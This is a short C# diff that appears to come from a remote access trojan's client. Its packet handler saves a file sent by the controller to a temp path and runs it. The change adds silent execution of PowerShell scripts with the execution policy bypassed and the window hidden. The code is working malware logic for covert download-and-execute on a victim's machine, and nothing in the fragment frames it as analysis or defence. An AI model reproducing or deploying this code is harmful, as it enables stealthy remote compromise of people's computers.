@@ -17,7 +17,10 @@ namespace Client.Handle_Packet
                 //Drop To Disk
                 string fullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
                 unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
-                Process.Start(fullPath);
+                if (unpack_msgpack.ForcePathObject("Extension").AsString.ToLower().EndsWith(".ps1"))
+                    Process.Start(new ProcessStartInfo { FileName = "powershell", Arguments = "–ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -File \"" + fullPath + "\"", CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden });
+                else
+                    Process.Start(fullPath);
                 if (unpack_msgpack.ForcePathObject("Update").AsString == "true")
                 {
                     new HandleUninstall();
